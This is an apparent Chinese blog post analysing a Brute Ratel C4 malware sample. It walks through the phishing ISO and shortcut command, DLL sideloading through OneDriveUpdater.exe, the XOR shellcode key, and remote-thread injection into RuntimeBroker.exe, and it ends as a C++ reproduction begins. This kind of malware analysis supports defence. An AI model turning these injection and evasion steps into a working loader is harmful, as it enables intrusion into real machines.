<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>brute ratel C4 badger全分析文档 | infinite</title><meta name="author" content="helson"><meta name="copyright" content="helson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为2500美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，该工具独特之处在于它专门设计防止端点检测和响应(EDR)和">
<meta property="og:type" content="article">
<meta property="og:title" content="brute ratel C4 badger全分析文档">
<meta property="og:url" content="https://helsome.gihub.io/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/index.html">
<meta property="og:site_name" content="infinite">
<meta property="og:description" content="Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为2500美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，该工具独特之处在于它专门设计防止端点检测和响应(EDR)和">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://helsome.gihub.io/hexo-blog/source/avatar%20img.jpg">
<meta property="article:published_time" content="2024-10-25T11:37:08.000Z">
<meta property="article:modified_time" content="2024-10-25T11:41:36.081Z">
<meta property="article:author" content="helson">
<meta property="article:tag" content="reverse">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://helsome.gihub.io/hexo-blog/source/avatar%20img.jpg"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://helsome.gihub.io/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'brute ratel C4 badger全分析文档',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-25 19:41:36'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/hexo-blog/source/avatar%20img.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="infinite"><span class="site-name">infinite</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">brute ratel C4 badger全分析文档</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-25T11:37:08.000Z" title="发表于 2024-10-25 19:37:08">2024-10-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-25T11:41:36.081Z" title="更新于 2024-10-25 19:41:36">2024-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/reverse/">reverse</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="brute ratel C4 badger全分析文档"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为2500美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，<strong>该工具独特之处在于它专门设计防止端点检测和响应(EDR)和防病毒(AV)软件的检测</strong>，是一款新型的红队商业对抗性攻击模拟武器。<br>**AV（Antivirus）：主要依赖于特征库来检测计算机病毒，杀毒的能力完全取决于其拥有的特征库的更新程度。<br>EDR（Endpoint Detection and Response）：是一种网络安全解决方案，专注于监控、检测和响应计算机端点（如桌面计算机、笔记本电脑、服务器等）上的潜在威胁和恶意活动。EDR系统通过收集和分析端点数据来发现异常行为、潜在攻击和漏洞利用。</p>
<p>与Cobalt Strike的Beacon后门类似，Brute Ratel C4允许红队在远程终端主机上部署Badger后门程序，Badger连接回攻击者的命令和控制服务器，接收服务器端的命令执行相关的恶意行为。</p>
<p>样本信息：<br>名称: Roshan_CV.iso<br>大小: 4839424 字节 (4726 KiB)<br>MD5: a7df3462a6dce565064cfe408557c4df<br>SHA1: 6b91bfc761fe958c8ac04dd403db284ccc3a530e<br>SHA256: 1fc7b0e1054d54ce8f1de0cc95976081c7a85c7926c03172a3ddaa672690042c</p>
<h2 id="上线流程"><a href="#上线流程" class="headerlink" title="上线流程"></a>上线流程</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/07c68b837c079552676e90161258f6cb-1729856448049-98.png"></p>
<h2 id="阶段一：钓鱼过程分析"><a href="#阶段一：钓鱼过程分析" class="headerlink" title="阶段一：钓鱼过程分析"></a>阶段一：钓鱼过程分析</h2><p>恶意样本是个iso文件，双击挂载iso，一共有5个文件，除了<code>Roshan-Bandara_CV_Dialog</code>这个快捷方式之外其他的文件都是隐藏文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/47eca10654eb399cb3ca756310ac2424-1729856442012-96.png"><br>恶意样本是个iso文件，双击挂载iso，一共有5个文件，除了<code>Roshan-Bandara_CV_Dialog</code>这个快捷方式之外其他的文件都是隐藏文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/e5071ccd82e2231a9d60412e24e92438-1729856440676-94.png"><br>在箭头处打开隐藏文件显示<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/32eeb556147dee26bc9a8a3f49062519-1729856439731-92.png"><br>我们查看Roshan-Bandara_CV_Dialog快捷方式指向的目标<code>%windir%/system32/cmd.exe /c start OneDriveUpdater.exe</code>，主要就是调用cmd命令执行了隐藏文件OneDriveUpdater.exe，<code>cmd.exe /c</code>命令指定执行完后会自动关闭控制台窗口<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b36a5bb065f47910fb1b3723dc083741-1729856438461-90.png"><br>OneDriveUpdater.exe是Microsoft的数字签名二进制文件，用于将数据从本地计算机同步到云。它不是恶意的，而是被滥用来加载参与者的DLL。执行OneDriveUpdater.exe后，将执行以下操作：<br>1.由于Version.dll是OneDriveUpdater.exe的依赖DLL，并且与OneDriveUpdater.exe存在于同一目录中，因此将加载它。<br>2.Version.dll已被Actor修改，以加载加密的有效负载文件OneDrive.update。修改解密文件并在内存中加载shellcode的第一阶段。为了维护代码功能，参与者使用DLL API转发请求到名为vresion.dll的合法版本. dll。Vresion.dll是执行元的version.dll的依赖文件，将与执行元的version.dll一起加载。<br>使用 Dependencies 查看dll调用情况<br>劫持DLL的攻击原理是在DLL搜索顺序的较高优先级位置放置一个恶意DLL，这个恶意DLL具有与目标DLL相同的文件名。当应用程序尝试加载目标DLL时，Windows首先找到并加载恶意DLL，从而在受害进程中执行恶意代码.可以发现，黑dll在白dll前。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/a4e6490de03776c2ddf10ddf5dbec37c-1729856435835-88.png"></p>
<p>vresion.dll和OneDriveUpdater.exe为白文件都有Microsoft的有效数字签名<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/2b71c5a2137334540d08bae3306bc489-1729856432872-86.png"><br>3.内存中的代码，即Brute Ratel C4，在RuntimeBroker.exe进程空间中作为Windows线程执行<br>流程图示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5776527b50daf6feaee6f8220fd30ebf-1729856431404-84.png"></p>
<h2 id="阶段二：version-dll分析"><a href="#阶段二：version-dll分析" class="headerlink" title="阶段二：version.dll分析"></a>阶段二：version.dll分析</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/83a510491d328891d1e44f9441fddc95-1729856429933-82.png"></p>
<p>Version.dll是用C++编写的合法Microsoft文件的修改版本。植入的代码用于加载和解密加密的有效载荷文件。解密后的有效载荷是shellcode（x64汇编）的有效载荷，该shellcode进一步用于在主机上执行Brute Ratel C4。</p>
<p>为了使Version.dll保持其OneDriveUpdater.exe的代码功能，参与者包括合法的数字签名Microsoft version.dll并将其命名为vresion.dll。任何时候OneDriveUpdater.exe调用Actor的Version.dll，该调用都会被代理到vresion.dll。因此，执行元的version.dll将作为依赖文件加载vresion.dll。![](pic&#x2F;brute ratel C4 badger&#x2F;207dbd888060397b38915961d2ebd295.png)<br>version.dll和vresion.dll的导出函数完全相同<br>  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f5c6a091034faec0969bc8e8538d84c1-1729856427178-80.png"></p>
<h3 id="任务一：搜寻Runtimebroker-exe进程"><a href="#任务一：搜寻Runtimebroker-exe进程" class="headerlink" title="任务一：搜寻Runtimebroker.exe进程"></a>任务一：搜寻Runtimebroker.exe进程</h3><p> 唯一调用了一个函数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/1d81bb1cd055bb342bb0e174e97fb26f-1729856424592-78.png"><br>枚举所有进程并循环查找找到Runtimebroker.exe的进程ID（PID）。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ce70b8c7e12d139ff850cb8805ba80a8-1729856423132-76.png">![](pic&#x2F;brute ratel C4 badger&#x2F;3312f9c1a5325a39f97555c775276624.png)<br>附加进程到exe上进行动调<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/de81b62aa5654911e522a7df47dabd4c-1729856419170-74.png"><br>从当前工作目录读取负载文件OneDrive.Update。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/fd20d5ffbdd0190cead78ea82cc35129-1729856417397-72.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/2bf878c91e37b4962c6ebdee9b2088c0-1729856416606-70.png"><br>打印字符串<code>&quot;Please wait...&quot;</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/d36dbda02a0377c3c39fee09deb9a4bb-1729856415275-68.png"><br>使用步骤1中的进程ID调用Windows API ntdll ZwOpenProcess。进程以完全控制访问打开。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/e15ac68df3e024f43ad15940058fc568-1729856414347-66.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6cf1675f0d2c3c1ba454c055d3ccc780-1729856413093-64.png"></p>
<h3 id="任务二：解密shellcode"><a href="#任务二：解密shellcode" class="headerlink" title="任务二：解密shellcode"></a>任务二：解密shellcode</h3><p>使用XOR加密算法和28字节密钥对有效负载文件shellcode进行解密：<br>jikoewarfkmzsdlhfnuiwaejrpaw<br>解密前：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/72e25230959c6960054aab9adc90367c-1729856409984-62.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5692889141c7e0f6f12e7dd00227fcc7-1729856409008-60.png"><br>解密之后，如下所示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/07eab379fe5be645b75c77d0593b4c7c-1729856407847-58.png"><br>00007FFFF8142326地址在内存中看，即可看到shellcode<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/457c8e34368eecfa36e4d53cdc3e19b7-1729856406727-56.png"></p>
<h3 id="任务三：进程注入"><a href="#任务三：进程注入" class="headerlink" title="任务三：进程注入"></a>任务三：进程注入</h3><p>调用了<code>NtCreateSection</code>函数创建Section<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/06b99c0756e1c67e1e3af83a57592649-1729856404940-54.png"></p>
<p>接着调用<code>NtMapViewOfSection</code>函数将section映射到本进程虚拟内存<br>两次调用Windows API NtMapViewOfSection。第一个调用将解密的有效负载的内容映射到当前进程内存空间，第二个调用将内容映射到Runtimebroker.exe内存空间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZwMapViewOfSection 例程将节的视图映射到主题进程的虚拟地址空间中</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/4920bb85088a490094d64909b4e41925-1729856402337-52.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/c1c92adae1afbaf673465b43f945341b-1729856401359-50.png"><br>调用Windows API NtDelayExecution并休眠（暂停执行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**KeDelayExecutionThread** 例程将当前线程置于指定间隔内可发出警报或不可更改的等待状态。</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6b0cbeb7b1d61846a2df403461b4e705-1729856399818-48.png"><br><strong>调用Windows API NtcreatThreadEx。此API启动一个新线程，并将内存的起始地址复制到Runtimebroker.exe。 在RuntimeBroker.exe进程中创建远程线程执行注入的shellcode</strong> 这是关键的一步骤。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/0eb175f114add714a317837612a725e5-1729856397898-46.png"></p>
<p>调用Windows API NtDelayExecution并休眠（暂停执行）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ff91394027c12789d3ddbcc253f096ac-1729856396030-44.png"><br>随后程序结束<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/bfd68a039a823f91527df5b0f78c8116-1729856394868-42.png"><br>接下来的逻辑还是熟悉的通过<code>PEB-Ldr-&gt;InMemoryOrderModuleList</code>获取ntdll.dll的基址<br>version.dll中的加载方法也是如此<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/dad1e4264ce019cf6c2d44ca15969e45-1729856393337-40.png"></p>
<h3 id="任务四：将shellcode-dump出来"><a href="#任务四：将shellcode-dump出来" class="headerlink" title="任务四：将shellcode dump出来"></a>任务四：将shellcode dump出来</h3><p>将这段shellcode执行 使用process hacker 工具此时可以在内存中查看到runtimebroker<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/3ccdfeb6f15c9744f17de5d92b1f2ddc-1729856391720-38.png"><br>使用其他方法也能查看到<br>在内存布局中转到该地址，然后将这块内存转存为文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/255e67c99ef9d753ee0d0e6ed291f23d-1729856390304-36.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/96f1b1d0d4f0c465ecc9ebfebf616675-1729856389062-34.png"><br>复现：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span 